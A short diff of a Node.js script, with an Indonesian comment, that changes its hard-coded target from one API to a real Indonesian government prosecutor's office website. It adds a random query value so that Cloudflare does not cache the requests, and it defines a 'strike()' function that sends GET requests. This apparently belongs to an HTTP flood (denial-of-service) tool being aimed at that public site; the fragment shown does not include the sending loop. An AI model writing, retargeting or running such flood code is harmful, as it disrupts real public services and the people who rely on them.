@@ -1,8 +1,7 @@
 const https = require('https');
 
 // Target API - Kita tambahkan random parameter agar tidak di-cache oleh Cloudflare
-const target = 'https://api.nvidiabotz.xyz/api/main?random=' + Math.random().toString(36).substring(7);
-
+const target = 'https://kejari-pali.kejaksaan.go.id/?s=' + Math.random().toString(36).substring(7);
 function strike() {
     const options = {
         method: 'GET',
